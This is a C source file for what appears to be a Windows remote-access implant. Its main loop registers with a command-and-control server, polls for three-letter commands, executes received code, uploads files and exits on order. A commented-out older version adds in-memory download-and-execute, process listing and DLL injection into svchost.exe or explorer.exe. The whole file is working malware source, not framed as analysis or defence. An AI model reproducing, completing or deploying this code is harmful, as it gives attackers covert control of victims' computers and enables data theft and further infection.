#include "main.h"
//c2 server: 3 letter parent command space child command(if available) space data

int cmdswitch(char* cmd){
    if (mystrstr(cmd, "CAL") == cmd) return 0;
    else if(mystrstr(cmd, "NOP") == cmd) return 1;
    else if(mystrstr(cmd, "EC1") == cmd) return 2;
    else if(mystrstr(cmd, "EC0") == cmd) return 3;
    else if(mystrstr(cmd, "STL") == cmd) return 4;
    else if(mystrstr(cmd, "EDL") == cmd) return 5;
    else if(mystrstr(cmd, "DIE") == cmd) return 6;
    else if(mystrstr(cmd, "UPD") == cmd) return 7;
    else return 1;
}

LPVOID ReportExecutionFail(){
    return 0;
}

int initConnection(){
    HANDLE hMutex;
    int try = 0;
    char* UriBuffer = systemFunction();

    hMutex = API(KERNEL32, CreateMutexA)(NULL, FALSE, SYNCER);
    while(!BeaconCallbackC2(_C2_CALLBACK_ADDRESS, 0, _REGISTER_URL, DO_REGISTER, UriBuffer, mystrlen(UriBuffer))){
        API(KERNEL32,Sleep)(30000);
        try ++;

        if (try > 20){
            try = 0;
            API(KERNEL32,Sleep)(12 * 60000);
        }
    }
    hFree(UriBuffer);
    return 0;
}


int main() {
    char *Buffer;
    char cmd[4];
    int task = 1996; 

    goto initC2;
    //initConnection();
    while (1){

        BOOL Success = FALSE;
        mymemcpy(cmd, "CAL", 4);

    loopinit:
        task = cmdswitch(cmd);
initC2:
        switch (task){
        case 1996:
            initConnection();
            continue;
        case 0:
            Buffer = BeaconCallbackC2(_C2_CALLBACK_ADDRESS, 0, _CALLBACK_URL, NULL, NULL, NULL);

            if (!Buffer){
                API(KERNEL32,Sleep)(30000);
                continue;
            }

            //3 letter command and then a space then args
            mymemcpy(cmd, Buffer,3);
            cmd[3] = '\0';
            goto loopinit;
        case 1:
            API(KERNEL32,Sleep)(10000);
            Success = TRUE;
            break;
        case 2:
            Success = ExecuteCode(Buffer+4, TRUE);
            break;
        case 3:
            Success = ExecuteCode(Buffer+4, FALSE);
            break;
        case 4:
            Success = Stdlib(Buffer+4);
            break;
        case 5:
            //Success = ExecuteDLL(Buffer+4);
            break;
        case 6:
            API(KERNEL32,ExitProcess)(1);
        case 7:
            Success = fUpload(Buffer+4);
            break;
        default:
            break;
        }
        hFree(Buffer);

        if (!Success){
            ReportExecutionFail();
        }
        API(KERNEL32,Sleep)(10000);
    }
}


/*
int main(){
	while (1){
		char* commBuf;

		if(initConnection()) {
			Sleep(30000);
			continue;
		}
		commBuf = hAlloc(4096);
		while(recvLine(clientSocket, commBuf, 4096)){
			if(mystrstr(commBuf, "PING") == commBuf){
                sockprintf(clientSocket, "PONG", 5);
                continue;
            }
            if(mystrstr(commBuf, runPE) == commBuf){
            	BYTE* fileMemory;
            	DWORD fileSize =0;

            	fileMemory = downloadToMem(commBuf+6, &fileSize);
            	RunPortableExecutable(fileMemory);
            	sockprintf(clientSocket, "DONE", 5);
            	continue;
            }
            if(mystrstr(commBuf, dwnldnExec) == commBuf){
            	char* cp, *filename; //filename.exe,.js etc
            	DWORD fileSize =0, ret;

            	cp = split(commBuf+11);
            	filename = mystrstr(commBuf, "|")+1;
            	dwnldNExecute(cp, filename);
            	sockprintf(clientSocket, "DONE", 5);
            	hFree(cp);
            	continue;
            }
            else if(mystrstr(commBuf, commDownload) == commBuf){
            	char* cp, *filelocation; //location with name like C:\\hello.exe

            	cp = split(commBuf+6);
            	filelocation = mystrstr(commBuf, "|")+1;
            	dwnldNSave(cp,filelocation);
            	sockprintf(clientSocket, "DONE", 5);
            	hFree(cp);
            	continue;
            }
           
        
            else if(mystrstr(commBuf, listProc) == commBuf){
                char* buf = getps();
                sockprintf(clientSocket, buf, mystrlen(buf)+1);
                hFree(buf);
                continue;
            }
            else if(mystrstr(commBuf, injectDll) == commBuf){
                BYTE* fileMemory;
                DWORD fileSize =0;
                BOOL isX64;
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                ZeroMemory(&pi, sizeof(pi));
                si.cb= sizeof(si);
                si.dwFlags |=  (STARTF_USESTDHANDLES);

                API(KERNEL32, IsWow64Process)((HANDLE)-1, &isX64);
                fileMemory = downloadToMem(commBuf+10, &fileSize);
                if(isX64){
                    if(!API(KERNEL32,CreateProcessA)("C:\\Windows\\SysWOW64\\svchost.exe",NULL,NULL,NULL,FALSE,EXTENDED_STARTUPINFO_PRESENT,NULL,NULL,&si,&pi)){
                        API(KERNEL32,CreateProcessA)("C:\\Windows\\SysWOW64\\explorer.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);
                    }  
                }
                else{
                    if(!API(KERNEL32,CreateProcessA)("C:\\Windows\\system32\\svchost.exe",NULL,NULL,NULL,FALSE,EXTENDED_STARTUPINFO_PRESENT,NULL,NULL,&si,&pi)){
                        API(KERNEL32,CreateProcessA)("C:\\Windows\\system32\\explorer.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);
                    } 
                }
                InjectDLL(fileMemory, fileSize, pi.dwProcessId);
                sockprintf(clientSocket, "DONE", 5);
                continue;
            }
            else{
            	sockprintf(clientSocket, "INVALID COMMAND\0", 16);
                continue;
            }
		}
		hFree(commBuf);
	}
}
*/